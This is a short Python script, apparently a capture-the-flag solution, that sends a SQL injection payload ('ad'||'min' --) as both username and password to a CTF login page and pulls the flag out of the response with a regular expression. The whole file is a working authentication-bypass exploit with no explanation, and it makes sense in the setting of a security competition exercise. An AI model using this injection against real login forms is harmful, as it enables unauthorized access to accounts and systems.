#!/usr/bin/python3

import requests	
import re
url = "https://canyou.freedomctf.org/login"

r = requests.post(url, data={"username": "ad'||'min' --", "password": "ad'||'min' --"})

#print(r.text)
print(re.findall("flag{.*}", r.text)[0])
